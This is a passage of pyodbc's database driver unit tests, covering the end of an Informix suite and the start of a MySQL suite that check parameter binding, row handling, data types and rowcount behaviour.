        count = self.cursor.execute(""select count(*) from t1"").fetchone()[0]
        self.assertEqual(count, len(params))

        self.cursor.execute(""select a, b from t1 order by a"")
        rows = self.cursor.fetchall()
        self.assertEqual(count, len(rows))

        for param, row in zip(params, rows):
            self.assertEqual(param[0], row[0])
            self.assertEqual(param[1], row[1])


    def test_executemany_one(self):
        ""Pass executemany a single sequence""
        self.cursor.execute(""create table t1(a int, b varchar(10))"")

        params = [ (1, ""test"") ]

        self.cursor.executemany(""insert into t1(a, b) values (?,?)"", params)

        count = self.cursor.execute(""select count(*) from t1"").fetchone()[0]
        self.assertEqual(count, len(params))

        self.cursor.execute(""select a, b from t1 order by a"")
        rows = self.cursor.fetchall()
        self.assertEqual(count, len(rows))

        for param, row in zip(params, rows):
            self.assertEqual(param[0], row[0])
            self.assertEqual(param[1], row[1])
        

    def test_executemany_failure(self):
        """"""
        Ensure that an exception is raised if one query in an executemany fails.
        """"""
        self.cursor.execute(""create table t1(a int, b varchar(10))"")

        params = [ (1, 'good'),
                   ('error', 'not an int'),
                   (3, 'good') ]
        
        self.assertRaises(pyodbc.Error, self.cursor.executemany, ""insert into t1(a, b) value (?, ?)"", params)

        
    def test_row_slicing(self):
        self.cursor.execute(""create table t1(a int, b int, c int, d int)"");
        self.cursor.execute(""insert into t1 values(1,2,3,4)"")

        row = self.cursor.execute(""select * from t1"").fetchone()

        result = row[:]
        self.assertTrue(result is row)

        result = row[:-1]
        self.assertEqual(result, (1,2,3))

        result = row[0:4]
        self.assertTrue(result is row)


    def test_row_repr(self):
        self.cursor.execute(""create table t1(a int, b int, c int, d int)"");
        self.cursor.execute(""insert into t1 values(1,2,3,4)"")

        row = self.cursor.execute(""select * from t1"").fetchone()

        result = str(row)
        self.assertEqual(result, ""(1, 2, 3, 4)"")

        result = str(row[:-1])
        self.assertEqual(result, ""(1, 2, 3)"")

        result = str(row[:1])
        self.assertEqual(result, ""(1,)"")


    def test_concatenation(self):
        v2 = '0123456789' * 30
        v3 = '9876543210' * 30

        self.cursor.execute(""create table t1(c1 int identity(1, 1), c2 varchar(300), c3 varchar(300))"")
        self.cursor.execute(""insert into t1(c2, c3) values (?,?)"", v2, v3)

        row = self.cursor.execute(""select c2, c3, c2 + c3 as both from t1"").fetchone()

        self.assertEqual(row.both, v2 + v3)

    def test_view_select(self):
        # Reported in forum: Can't select from a view?  I think I do this a lot, but another test never hurts.

        # Create a table (t1) with 3 rows and a view (t2) into it.
        self.cursor.execute(""create table t1(c1 int identity(1, 1), c2 varchar(50))"")
        for i in range(3):
            self.cursor.execute(""insert into t1(c2) values (?)"", ""string%s"" % i)
        self.cursor.execute(""create view t2 as select * from t1"")

        # Select from the view
        self.cursor.execute(""select * from t2"")
        rows = self.cursor.fetchall()
        self.assertTrue(rows is not None)
        self.assertTrue(len(rows) == 3)

    def test_autocommit(self):
        self.assertEqual(self.cnxn.autocommit, False)

        othercnxn = pyodbc.connect(self.connection_string, autocommit=True)
        self.assertEqual(othercnxn.autocommit, True)

        othercnxn.autocommit = False
        self.assertEqual(othercnxn.autocommit, False)

    def test_unicode_results(self):
        ""Ensure unicode_results forces Unicode""
        othercnxn = pyodbc.connect(self.connection_string, unicode_results=True)
        othercursor = othercnxn.cursor()

        # ANSI data in an ANSI column ...
        othercursor.execute(""create table t1(s varchar(20))"")
        othercursor.execute(""insert into t1 values(?)"", 'test')

        # ... should be returned as Unicode
        value = othercursor.execute(""select s from t1"").fetchone()[0]
        self.assertEqual(value, u'test')


    def test_informix_callproc(self):
        try:
            self.cursor.execute(""drop procedure pyodbctest"")
            self.cnxn.commit()
        except:
            pass

        self.cursor.execute(""create table t1(s varchar(10))"")
        self.cursor.execute(""insert into t1 values(?)"", ""testing"")

        self.cursor.execute(""""""
                            create procedure pyodbctest @var1 varchar(32)
                            as 
                            begin 
                              select s 
                              from t1 
                            return 
                            end
                            """""")
        self.cnxn.commit()

        # for row in self.cursor.procedureColumns('pyodbctest'):
        #     print row.procedure_name, row.column_name, row.column_type, row.type_name

        self.cursor.execute(""exec pyodbctest 'hi'"")

        # print self.cursor.description
        # for row in self.cursor:
        #     print row.s

    def test_skip(self):
        # Insert 1, 2, and 3.  Fetch 1, skip 2, fetch 3.

        self.cursor.execute(""create table t1(id int)"");
        for i in range(1, 5):
            self.cursor.execute(""insert into t1 values(?)"", i)
        self.cursor.execute(""select id from t1 order by id"")
        self.assertEqual(self.cursor.fetchone()[0], 1)
        self.cursor.skip(2)
        self.assertEqual(self.cursor.fetchone()[0], 4)

    def test_timeout(self):
        self.assertEqual(self.cnxn.timeout, 0) # defaults to zero (off)

        self.cnxn.timeout = 30
        self.assertEqual(self.cnxn.timeout, 30)

        self.cnxn.timeout = 0
        self.assertEqual(self.cnxn.timeout, 0)

    def test_sets_execute(self):
        # Only lists and tuples are allowed.
        def f():
            self.cursor.execute(""create table t1 (word varchar (100))"")
            words = set (['a'])
            self.cursor.execute(""insert into t1 (word) VALUES (?)"", [words])

        self.assertRaises(pyodbc.ProgrammingError, f)

    def test_sets_executemany(self):
        # Only lists and tuples are allowed.
        def f():
            self.cursor.execute(""create table t1 (word varchar (100))"")
            words = set (['a'])
            self.cursor.executemany(""insert into t1 (word) values (?)"", [words])
            
        self.assertRaises(TypeError, f)

    def test_row_execute(self):
        ""Ensure we can use a Row object as a parameter to execute""
        self.cursor.execute(""create table t1(n int, s varchar(10))"")
        self.cursor.execute(""insert into t1 values (1, 'a')"")
        row = self.cursor.execute(""select n, s from t1"").fetchone()
        self.assertNotEqual(row, None)

        self.cursor.execute(""create table t2(n int, s varchar(10))"")
        self.cursor.execute(""insert into t2 values (?, ?)"", row)
        
    def test_row_executemany(self):
        ""Ensure we can use a Row object as a parameter to executemany""
        self.cursor.execute(""create table t1(n int, s varchar(10))"")

        for i in range(3):
            self.cursor.execute(""insert into t1 values (?, ?)"", i, chr(ord('a')+i))

        rows = self.cursor.execute(""select n, s from t1"").fetchall()
        self.assertNotEqual(len(rows), 0)

        self.cursor.execute(""create table t2(n int, s varchar(10))"")
        self.cursor.executemany(""insert into t2 values (?, ?)"", rows)
        
    def test_description(self):
        ""Ensure cursor.description is correct""

        self.cursor.execute(""create table t1(n int, s varchar(8), d decimal(5,2))"")
        self.cursor.execute(""insert into t1 values (1, 'abc', '1.23')"")
        self.cursor.execute(""select * from t1"")

        # (I'm not sure the precision of an int is constant across different versions, bits, so I'm hand checking the
        # items I do know.

        # int
        t = self.cursor.description[0]
        self.assertEqual(t[0], 'n')
        self.assertEqual(t[1], int)
        self.assertEqual(t[5], 0)       # scale
        self.assertEqual(t[6], True)    # nullable

        # varchar(8)
        t = self.cursor.description[1]
        self.assertEqual(t[0], 's')
        self.assertEqual(t[1], str)
        self.assertEqual(t[4], 8)       # precision
        self.assertEqual(t[5], 0)       # scale
        self.assertEqual(t[6], True)    # nullable

        # decimal(5, 2)
        t = self.cursor.description[2]
        self.assertEqual(t[0], 'd')
        self.assertEqual(t[1], Decimal)
        self.assertEqual(t[4], 5)       # precision
        self.assertEqual(t[5], 2)       # scale
        self.assertEqual(t[6], True)    # nullable

        
    def test_none_param(self):
        ""Ensure None can be used for params other than the first""
        # Some driver/db versions would fail if NULL was not the first parameter because SQLDescribeParam (only used
        # with NULL) could not be used after the first call to SQLBindParameter.  This means None always worked for the
        # first column, but did not work for later columns.
        #
        # If SQLDescribeParam doesn't work, pyodbc would use VARCHAR which almost always worked.  However,
        # binary/varbinary won't allow an implicit conversion.

        self.cursor.execute(""create table t1(n int, blob varbinary(max))"")
        self.cursor.execute(""insert into t1 values (1, newid())"")
        row = self.cursor.execute(""select * from t1"").fetchone()
        self.assertEqual(row.n, 1)
        self.assertEqual(type(row.blob), buffer)

        self.cursor.execute(""update t1 set n=?, blob=?"", 2, None)
        row = self.cursor.execute(""select * from t1"").fetchone()
        self.assertEqual(row.n, 2)
        self.assertEqual(row.blob, None)


    def test_output_conversion(self):
        def convert(value):
            # `value` will be a string.  We'll simply add an X at the beginning at the end.
            return 'X' + value + 'X'
        self.cnxn.add_output_converter(pyodbc.SQL_VARCHAR, convert)
        self.cursor.execute(""create table t1(n int, v varchar(10))"")
        self.cursor.execute(""insert into t1 values (1, '123.45')"")
        value = self.cursor.execute(""select v from t1"").fetchone()[0]
        self.assertEqual(value, 'X123.45X')

        # Now clear the conversions and try again.  There should be no Xs this time.
        self.cnxn.clear_output_converters()
        value = self.cursor.execute(""select v from t1"").fetchone()[0]
        self.assertEqual(value, '123.45')


    def test_too_large(self):
        """"""Ensure error raised if insert fails due to truncation""""""
        value = 'x' * 1000
        self.cursor.execute(""create table t1(s varchar(800))"")
        def test():
            self.cursor.execute(""insert into t1 values (?)"", value)
        self.assertRaises(pyodbc.DataError, test)

    def test_geometry_null_insert(self):
        def convert(value):
            return value

        self.cnxn.add_output_converter(-151, convert) # -151 is SQL Server's geometry
        self.cursor.execute(""create table t1(n int, v geometry)"")
        self.cursor.execute(""insert into t1 values (?, ?)"", 1, None)
        value = self.cursor.execute(""select v from t1"").fetchone()[0]
        self.assertEqual(value, None)
        self.cnxn.clear_output_converters()

    def test_login_timeout(self):
        # This can only test setting since there isn't a way to cause it to block on the server side.
        cnxns = pyodbc.connect(self.connection_string, timeout=2)

    def test_row_equal(self):
        self.cursor.execute(""create table t1(n int, s varchar(20))"")
        self.cursor.execute(""insert into t1 values (1, 'test')"")
        row1 = self.cursor.execute(""select n, s from t1"").fetchone()
        row2 = self.cursor.execute(""select n, s from t1"").fetchone()
        b = (row1 == row2)
        self.assertEqual(b, True)

    def test_row_gtlt(self):
        self.cursor.execute(""create table t1(n int, s varchar(20))"")
        self.cursor.execute(""insert into t1 values (1, 'test1')"")
        self.cursor.execute(""insert into t1 values (1, 'test2')"")
        rows = self.cursor.execute(""select n, s from t1 order by s"").fetchall()
        self.assertTrue(rows[0] < rows[1])
        self.assertTrue(rows[0] <= rows[1])
        self.assertTrue(rows[1] > rows[0])
        self.assertTrue(rows[1] >= rows[0])
        self.assertTrue(rows[0] != rows[1])

        rows = list(rows)
        rows.sort() # uses <
        
    def test_context_manager(self):
        with pyodbc.connect(self.connection_string) as cnxn:
            cnxn.getinfo(pyodbc.SQL_DEFAULT_TXN_ISOLATION)

        # The connection should be closed now.
        def test():
            cnxn.getinfo(pyodbc.SQL_DEFAULT_TXN_ISOLATION)
        self.assertRaises(pyodbc.ProgrammingError, test)

    def test_untyped_none(self):
        # From issue 129
        value = self.cursor.execute(""select ?"", None).fetchone()[0]
        self.assertEqual(value, None)
        
    def test_large_update_nodata(self):
        self.cursor.execute('create table t1(a varbinary(max))')
        hundredkb = buffer('x'*100*1024)
        self.cursor.execute('update t1 set a=? where 1=0', (hundredkb,))

    def test_func_param(self):
        self.cursor.execute('''
                            create function func1 (@testparam varchar(4)) 
                            returns @rettest table (param varchar(4))
                            as 
                            begin
                                insert @rettest
                                select @testparam
                                return
                            end
                            ''')
        self.cnxn.commit()
        value = self.cursor.execute(""select * from func1(?)"", 'test').fetchone()[0]
        self.assertEqual(value, 'test')
        
    def test_no_fetch(self):
        # Issue 89 with FreeTDS: Multiple selects (or catalog functions that issue selects) without fetches seem to
        # confuse the driver.
        self.cursor.execute('select 1')
        self.cursor.execute('select 1')
        self.cursor.execute('select 1')

    def test_drivers(self):
        drivers = pyodbc.drivers()
        self.assertEqual(list, type(drivers))
        self.assertTrue(len(drivers) > 1)

        m = re.search('DRIVER={([^}]+)}', self.connection_string, re.IGNORECASE)
        current = m.group(1)
        self.assertTrue(current in drivers)
            


def main():
    from optparse import OptionParser
    parser = OptionParser(usage=usage)
    parser.add_option(""-v"", ""--verbose"", action=""count"", help=""Increment test verbosity (can be used multiple times)"")
    parser.add_option(""-d"", ""--debug"", action=""store_true"", default=False, help=""Print debugging items"")
    parser.add_option(""-t"", ""--test"", help=""Run only the named test"")

    (options, args) = parser.parse_args()

    if len(args) > 1:
        parser.error('Only one argument is allowed.  Do you need quotes around the connection string?')

    if not args:
        connection_string = load_setup_connection_string('informixtests')

        if not connection_string:
            parser.print_help()
            raise SystemExit()
    else:
        connection_string = args[0]

    cnxn = pyodbc.connect(connection_string)
    print_library_info(cnxn)
    cnxn.close()

    suite = load_tests(InformixTestCase, options.test, connection_string)

    testRunner = unittest.TextTestRunner(verbosity=options.verbose)
    result = testRunner.run(suite)


if __name__ == '__main__':

    # Add the build directory to the path so we're testing the latest build, not the installed version.

    add_to_path()

    import pyodbc
    main()
/n/n/ntests3/mysqltests.py/n/n#!/usr/bin/env python3
# -*- coding: latin-1 -*-

usage = """"""\
usage: %prog [options] connection_string

Unit tests for MySQL.  To use, pass a connection string as the parameter.  The tests will create and drop tables t1 and
t2 as necessary.  The default installation of mysql allows you to connect locally with no password and already contains
a 'test' database, so you can probably use the following.  (Update the driver name as appropriate.)

  ./mysqltests DRIVER={MySQL};DATABASE=test

These tests use the pyodbc library from the build directory, not the version installed in your
Python directories.  You must run `python setup.py build` before running these tests.

You can also put the connection string into a tmp/setup.cfg file like so:

  [mysqltests]
  connection-string=DRIVER={MySQL};SERVER=localhost;UID=uid;PWD=pwd;DATABASE=db
""""""

import sys, os, re
import unittest
from decimal import Decimal
from datetime import datetime, date, time
from os.path import join, getsize, dirname, abspath, basename
from testutils import *

_TESTSTR = '0123456789-abcdefghijklmnopqrstuvwxyz-'

def _generate_test_string(length):
    """"""
    Returns a string of composed of `seed` to make a string `length` characters long.

    To enhance performance, there are 3 ways data is read, based on the length of the value, so most data types are
    tested with 3 lengths.  This function helps us generate the test data.

    We use a recognizable data set instead of a single character to make it less likely that ""overlap"" errors will
    be hidden and to help us manually identify where a break occurs.
    """"""
    if length <= len(_TESTSTR):
        return _TESTSTR[:length]

    c = (length + len(_TESTSTR)-1) // len(_TESTSTR)
    v = _TESTSTR * c
    return v[:length]

class MySqlTestCase(unittest.TestCase):

    INTEGERS = [ -1, 0, 1, 0x7FFFFFFF ]
    BIGINTS  = INTEGERS + [ 0xFFFFFFFF, 0x123456789 ]

    SMALL_FENCEPOST_SIZES = [ 0, 1, 255, 256, 510, 511, 512, 1023, 1024, 2047, 2048, 4000 ]
    LARGE_FENCEPOST_SIZES = [ 4095, 4096, 4097, 10 * 1024, 20 * 1024 ]

    STR_FENCEPOSTS    = [ _generate_test_string(size) for size in SMALL_FENCEPOST_SIZES ]
    BLOB_FENCEPOSTS   = STR_FENCEPOSTS + [ _generate_test_string(size) for size in LARGE_FENCEPOST_SIZES ]

    def __init__(self, method_name, connection_string):
        unittest.TestCase.__init__(self, method_name)
        self.connection_string = connection_string

    def setUp(self):
        self.cnxn   = pyodbc.connect(self.connection_string)
        self.cursor = self.cnxn.cursor()

        # As of libmyodbc5w 5.3 SQLGetTypeInfo returns absurdly small sizes
        # leading to slow writes.  Override them:
        self.cnxn.maxwrite = 1024 * 1024 * 1024

        # My MySQL configuration (and I think the default) sends *everything*
        # in UTF-8.  The pyodbc default is to send Unicode as UTF-16 and to
        # decode WCHAR via UTF-16.  Change them both to UTF-8.
        self.cnxn.setdecoding(pyodbc.SQL_WCHAR, encoding='utf-8')
        self.cnxn.setencoding(encoding='utf-8')

        for i in range(3):
            try:
                self.cursor.execute(""drop table t%d"" % i)
                self.cnxn.commit()
            except:
                pass

        for i in range(3):
            try:
                self.cursor.execute(""drop procedure proc%d"" % i)
                self.cnxn.commit()
            except:
                pass

        self.cnxn.rollback()

    def tearDown(self):
        try:
            self.cursor.close()
            self.cnxn.close()
        except:
            # If we've already closed the cursor or connection, exceptions are thrown.
            pass

    def test_multiple_bindings(self):
        ""More than one bind and select on a cursor""
        self.cursor.execute(""create table t1(n int)"")
        self.cursor.execute(""insert into t1 values (?)"", 1)
        self.cursor.execute(""insert into t1 values (?)"", 2)
        self.cursor.execute(""insert into t1 values (?)"", 3)
        for i in range(3):
            self.cursor.execute(""select n from t1 where n < ?"", 10)
            self.cursor.execute(""select n from t1 where n < 3"")


    def test_different_bindings(self):
        self.cursor.execute(""create table t1(n int)"")
        self.cursor.execute(""create table t2(d datetime)"")
        self.cursor.execute(""insert into t1 values (?)"", 1)
        self.cursor.execute(""insert into t2 values (?)"", datetime.now())

    def test_drivers(self):
        p = pyodbc.drivers()
        self.assertTrue(isinstance(p, list))

    def test_datasources(self):
        p = pyodbc.dataSources()
        self.assertTrue(isinstance(p, dict))

    def test_getinfo_string(self):
        value = self.cnxn.getinfo(pyodbc.SQL_CATALOG_NAME_SEPARATOR)
        self.assertTrue(isinstance(value, str))

    def test_getinfo_bool(self):
        value = self.cnxn.getinfo(pyodbc.SQL_ACCESSIBLE_TABLES)
        self.assertTrue(isinstance(value, bool))

    def test_getinfo_int(self):
        value = self.cnxn.getinfo(pyodbc.SQL_DEFAULT_TXN_ISOLATION)
        self.assertTrue(isinstance(value, int))

    def test_getinfo_smallint(self):
        value = self.cnxn.getinfo(pyodbc.SQL_CONCAT_NULL_BEHAVIOR)
        self.assertTrue(isinstance(value, int))

    def _test_strtype(self, sqltype, value, colsize=None):
        """"""
        The implementation for string and binary tests.
        """"""
        assert colsize is None or (value is None or colsize >= len(value))

        if colsize:
            sql = ""create table t1(s %s(%s))"" % (sqltype, colsize)
        else:
            sql = ""create table t1(s %s)"" % sqltype

        try:
            self.cursor.execute(sql)
        except:
            print('>>>>', sql)
        self.cursor.execute(""insert into t1 values(?)"", value)
        v = self.cursor.execute(""select * from t1"").fetchone()[0]

        # Removing this check for now until I get the charset working properly.
        # If we use latin1, results are 'str' instead of 'unicode', which would be
        # correct.  Setting charset to ucs-2 causes a crash in SQLGetTypeInfo(SQL_DATETIME).
        # self.assertEqual(type(v), type(value))

        if value is not None:
            self.assertEqual(len(v), len(value))

        self.assertEqual(v, value)

    #
    # varchar
    #

    def test_varchar_null(self):
        self._test_strtype('varchar', None, 100)

    # Generate a test for each fencepost size: test_varchar_0, etc.
    def _maketest(value):
        def t(self):
            self._test_strtype('varchar', value, max(1, len(value)))
        return t
    for value in STR_FENCEPOSTS:
        locals()['test_varchar_%s' % len(value)] = _maketest(value)

    def test_varchar_many(self):
        self.cursor.execute(""create table t1(c1 varchar(300), c2 varchar(300), c3 varchar(300))"")

        v1 = 'ABCDEFGHIJ' * 30
        v2 = '0123456789' * 30
        v3 = '9876543210' * 30

        self.cursor.execute(""insert into t1(c1, c2, c3) values (?,?,?)"", v1, v2, v3);
        row = self.cursor.execute(""select c1, c2, c3 from t1"").fetchone()

        self.assertEqual(v1, row.c1)
        self.assertEqual(v2, row.c2)
        self.assertEqual(v3, row.c3)

    def test_varchar_upperlatin(self):
        self._test_strtype('varchar', u'�', colsize=3)

    def test_utf16(self):
        self.cursor.execute(""create table t1(c1 varchar(100) character set utf16, c2 varchar(100))"")
        self.cursor.execute(""insert into t1 values ('test', 'test')"")
        value = ""test""
        row = self.cursor.execute(""select c1,c2 from t1"").fetchone()
        for v in row:
            self.assertEqual(type(v), str)
            self.assertEqual(v, value)

    #
    # binary
    #

    def test_null_binary(self):
        self._test_strtype('varbinary', None, 100)

    def test_large_null_binary(self):
        # Bug 1575064
        self._test_strtype('varbinary', None, 4000)

    # Generate a test for each fencepost size: test_binary_0, etc.
    def _maketest(value):
        def t(self):
            self._test_strtype('varbinary', bytes(value, 'utf-8'), max(1, len(value)))
        return t
    for value in STR_FENCEPOSTS:
        locals()['test_binary_%s' % len(value)] = _maketest(value)

    #
    # blob
    #

    def test_blob_null(self):
        self._test_strtype('blob', None)

    # Generate a test for each fencepost size: test_blob_0, etc.
    def _maketest(value):
        def t(self):
            self._test_strtype('blob', bytes(value, 'utf-8'))
        return t
    for value in BLOB_FENCEPOSTS:
        locals()['test_blob_%s' % len(value)] = _maketest(value)

    def test_blob_upperlatin(self):
        self._test_strtype('blob', bytes('�', 'utf-8'))

    #
    # text
    #

    def test_null_text(self):
        self._test_strtype('text', None)

    # Generate a test for each fencepost size: test_text_0, etc.
    def _maketest(value):
        def t(self):
            self._test_strtype('text', value)
        return t
    for value in STR_FENCEPOSTS:
        locals()['test_text_%s' % len(value)] = _maketest(value)

    def test_text_upperlatin(self):
        self._test_strtype('text', '�')

    #
    # unicode
    #

    def test_unicode_query(self):
        self.cursor.execute(u""select 1"")

    #
    # bit
    #

    # The MySQL driver maps BIT colums to the ODBC bit data type, but they aren't behaving quite like a Boolean value
    # (which is what the ODBC bit data type really represents).  The MySQL BOOL data type is just an alias for a small
    # integer, so pyodbc can't recognize it and map it back to True/False.
    #
    # You can use both BIT and BOOL and they will act as you expect if you treat them as integers.  You can write 0 and
    # 1 to them and they will work.

    # def test_bit(self):
    #     value = True
    #     self.cursor.execute(""create table t1(b bit)"")
    #     self.cursor.execute(""insert into t1 values (?)"", value)
    #     v = self.cursor.execute(""select b from t1"").fetchone()[0]
    #     self.assertEqual(type(v), bool)
    #     self.assertEqual(v, value)
    #
    # def test_bit_string_true(self):
    #     self.cursor.execute(""create table t1(b bit)"")
    #     self.cursor.execute(""insert into t1 values (?)"", ""xyzzy"")
    #     v = self.cursor.execute(""select b from t1"").fetchone()[0]
    #     self.assertEqual(type(v), bool)
    #     self.assertEqual(v, True)
    #
    # def test_bit_string_false(self):
    #     self.cursor.execute(""create table t1(b bit)"")
    #     self.cursor.execute(""insert into t1 values (?)"", """")
    #     v = self.cursor.execute(""select b from t1"").fetchone()[0]
    #     self.assertEqual(type(v), bool)
    #     self.assertEqual(v, False)

    #
    # decimal
    #

    def test_small_decimal(self):
        # value = Decimal('1234567890987654321')
        value = Decimal('100010')       # (I use this because the ODBC docs tell us how the bytes should look in the C struct)
        self.cursor.execute(""create table t1(d numeric(19))"")
        self.cursor.execute(""insert into t1 values(?)"", value)
        v = self.cursor.execute(""select * from t1"").fetchone()[0]
        self.assertEqual(type(v), Decimal)
        self.assertEqual(v, value)


    def test_small_decimal_scale(self):
        # The same as small_decimal, except with a different scale.  This value exactly matches the ODBC documentation
        # example in the C Data Types appendix.
        value = '1000.10'
        value = Decimal(value)
        self.cursor.execute(""create table t1(d numeric(20,6))"")
        self.cursor.execute(""insert into t1 values(?)"", value)
        v = self.cursor.execute(""select * from t1"").fetchone()[0]
        self.assertEqual(type(v), Decimal)
        self.assertEqual(v, value)


    def test_negative_decimal_scale(self):
        value = Decimal('-10.0010')
        self.cursor.execute(""create table t1(d numeric(19,4))"")
        self.cursor.execute(""insert into t1 values(?)"", value)
        v = self.cursor.execute(""select * from t1"").fetchone()[0]
        self.assertEqual(type(v), Decimal)
        self.assertEqual(v, value)

    def _test_inttype(self, datatype, n):
        self.cursor.execute('create table t1(n %s)' % datatype)
        self.cursor.execute('insert into t1 values (?)', n)
        result = self.cursor.execute(""select n from t1"").fetchone()[0]
        self.assertEqual(result, n)

    def _maketest(datatype, value):
        def t(self):
            self._test_inttype(datatype, value)
        return t

    for value in INTEGERS:
        name = str(abs(value))
        if value < 0:
            name = 'neg_' + name
        locals()['test_int_%s' % name] = _maketest('int', value)

    for value in BIGINTS:
        name = str(abs(value))
        if value < 0:
            name = 'neg_' + name
        locals()['test_bigint_%s' % name] = _maketest('bigint', value)

    def test_subquery_params(self):
        """"""Ensure parameter markers work in a subquery""""""
        self.cursor.execute(""create table t1(id integer, s varchar(20))"")
        self.cursor.execute(""insert into t1 values (?,?)"", 1, 'test')
        row = self.cursor.execute(""""""
                                  select x.id
                                  from (
                                    select id
                                    from t1
                                    where s = ?
                                      and id between ? and ?
                                   ) x
                                   """""", 'test', 1, 10).fetchone()
        self.assertNotEqual(row, None)
        self.assertEqual(row[0], 1)

    def _exec(self):
        self.cursor.execute(self.sql)

    def test_close_cnxn(self):
        """"""Make sure using a Cursor after closing its connection doesn't crash.""""""

        self.cursor.execute(""create table t1(id integer, s varchar(20))"")
        self.cursor.execute(""insert into t1 values (?,?)"", 1, 'test')
        self.cursor.execute(""select * from t1"")

        self.cnxn.close()

        # Now that the connection is closed, we expect an exception.  (If the code attempts to use
        # the HSTMT, we'll get an access violation instead.)
        self.sql = ""select * from t1""
        self.assertRaises(pyodbc.ProgrammingError, self._exec)

    def test_empty_string(self):
        self.cursor.execute(""create table t1(s varchar(20))"")
        self.cursor.execute(""insert into t1 values(?)"", """")

    def test_fixed_str(self):
        value = ""testing""
        self.cursor.execute(""create table t1(s char(7))"")
        self.cursor.execute(""insert into t1 values(?)"", ""testing"")
        v = self.cursor.execute(""select * from t1"").fetchone()[0]
        self.assertEqual(v, value)

    def test_negative_row_index(self):
        self.cursor.execute(""create table t1(s varchar(20))"")
        self.cursor.execute(""insert into t1 values(?)"", ""1"")
        row = self.cursor.execute(""select * from t1"").fetchone()
        self.assertEqual(row[0], ""1"")
        self.assertEqual(row[-1], ""1"")

    def test_version(self):
        self.assertEqual(3, len(pyodbc.version.split('.'))) # 1.3.1 etc.

    #
    # date, time, datetime
    #

    def test_datetime(self):
        value = datetime(2007, 1, 15, 3, 4, 5)

        self.cursor.execute(""create table t1(dt datetime)"")
        self.cursor.execute(""insert into t1 values (?)"", value)

        result = self.cursor.execute(""select dt from t1"").fetchone()[0]
        self.assertEqual(value, result)

    def test_date(self):
        value = date(2001, 1, 1)

        self.cursor.execute(""create table t1(dt date)"")
        self.cursor.execute(""insert into t1 values (?)"", value)

        result = self.cursor.execute(""select dt from t1"").fetchone()[0]
        self.assertEqual(type(result), type(value))
        self.assertEqual(result, value)

    #
    # ints and floats
    #

    def test_int(self):
        value = 1234
        self.cursor.execute(""create table t1(n int)"")
        self.cursor.execute(""insert into t1 values (?)"", value)
        result = self.cursor.execute(""select n from t1"").fetchone()[0]
        self.assertEqual(result, value)

    def test_negative_int(self):
        value = -1
        self.cursor.execute(""create table t1(n int)"")
        self.cursor.execute(""insert into t1 values (?)"", value)
        result = self.cursor.execute(""select n from t1"").fetchone()[0]
        self.assertEqual(result, value)

    def test_bigint(self):

        # This fails on 64-bit Fedora with 5.1.
        # Should return 0x0123456789
        # Does return   0x0000000000
        #
        # Top 4 bytes are returned as 0x00 00 00 00.  If the input is high enough, they are returned as 0xFF FF FF FF.
        input = 0x123456789
        self.cursor.execute(""create table t1(d bigint)"")
        self.cursor.execute(""insert into t1 values (?)"", input)
        result = self.cursor.execute(""select d from t1"").fetchone()[0]
        self.assertEqual(result, input)

    def test_float(self):
        value = 1234.5
        self.cursor.execute(""create table t1(n float)"")
        self.cursor.execute(""insert into t1 values (?)"", value)
        result = self.cursor.execute(""select n from t1"").fetchone()[0]
        self.assertEqual(result, value)

    def test_negative_float(self):
        value = -200
        self.cursor.execute(""create table t1(n float)"")
        self.cursor.execute(""insert into t1 values (?)"", value)
        result  = self.cursor.execute(""select n from t1"").fetchone()[0]
        self.assertEqual(value, result)


    def test_date(self):
        value = date.today()

        self.cursor.execute(""create table t1(d date)"")
        self.cursor.execute(""insert into t1 values (?)"", value)

        result = self.cursor.execute(""select d from t1"").fetchone()[0]
        self.assertEqual(value, result)


    def test_time(self):
        value = datetime.now().time()

        # We aren't yet writing values using the new extended time type so the value written to the database is only
        # down to the second.
        value = value.replace(microsecond=0)

        self.cursor.execute(""create table t1(t time)"")
        self.cursor.execute(""insert into t1 values (?)"", value)

        result = self.cursor.execute(""select t from t1"").fetchone()[0]
        self.assertEqual(value, result)

    #
    # misc
    #

    def test_rowcount_delete(self):
        self.assertEqual(self.cursor.rowcount, -1)
        self.cursor.execute(""create table t1(i int)"")
        count = 4
        for i in range(count):
            self.cursor.execute(""insert into t1 values (?)"", i)
        self.cursor.execute(""delete from t1"")
        self.assertEqual(self.cursor.rowcount, count)

    def test_rowcount_nodata(self):
        """"""
        This represents a different code path than a delete that deleted something.

        The return value is SQL_NO_DATA and code after it was causing an error.  We could use SQL_NO_DATA to step over
        the code that errors out and drop down to the same SQLRowCount code.  On the other hand, we could hardcode a
        zero return value.
        """"""
        self.cursor.execute(""create table t1(i int)"")
        # This is a different code path internally.
        self.cursor.execute(""delete from t1"")
        self.assertEqual(self.cursor.rowcount, 0)

    def test_rowcount_select(self):
        """"""
        Ensure Cursor.rowcount is set properly after a select statement.

        pyodbc calls SQLRowCount after each execute and sets Cursor.rowcount.  Databases can return the actual rowcount
        or they can return -1 if it would help performance.  MySQL seems to always return the correct rowcount.
        """"""
        self.cursor.execute(""create table t1(i int)"")
        count = 4
        for i in range(count):
            self.cursor.execute(""insert into t1 values (?)"", i)
        self.cursor.execute(""select * from t1"")
        self.assertEqual(self.cursor.rowcount, count)

        rows = self.cursor.fetchall()
        self.assertEqual(len(rows), count)
        self.assertEqual(self.cursor.rowcount, count)

    def test_rowcount_reset(self):
        ""Ensure rowcount is reset to -1""

        # The Python DB API says that rowcount should be set to -1 and most ODBC drivers let us know there are no
        # records.  MySQL always returns 0, however.  Without parsing the SQL (which we are not going to do), I'm not
        # sure how we can tell the difference and set the value to -1.  For now, I'll have this test check for 0.

        self.cursor.execute(""create table t1(i int)"")
        count = 4
        for i in range(count):
            self.cursor.execute(""insert into t1 values (?)"", i)
        self.assertEqual(self.cursor.rowcount, 1)

        self.cursor.execute(""create table t2(i int)"")
        self.assertEqual(self.cursor.rowcount, 0)

    def test_lower_case(self):
        ""Ensure pyodbc.lowercase forces returned column names to lowercase.""

        # Has to be set before creating the cursor, so we must recreate self.cursor.

        pyodbc.lowercase = True
        self.cursor = self.cnxn.cursor()

        self.cursor.execute(""create table t1(Abc int, dEf int)"")
        self.cursor.execute(""select * from t1"")

        names = [ t[0] for t in self.cursor.description ]
        names.sort()

        self.assertEqual(names, [ ""abc"", ""def"" ])

        # Put it back so other tests don't fail.
        pyodbc.lowercase = False

    def test_row_description(self):
        """"""
        Ensure Cursor.description is accessible as Row.cursor_description.
        """"""
        self.cursor = self.cnxn.cursor()
        self.cursor.execute(""create table t1(a int, b char(3))"")
        self.cnxn.commit()
        self.cursor.execute(""insert into t1 values(1, 'abc')"")

        row = self.cursor.execute(""select * from t1"").fetchone()
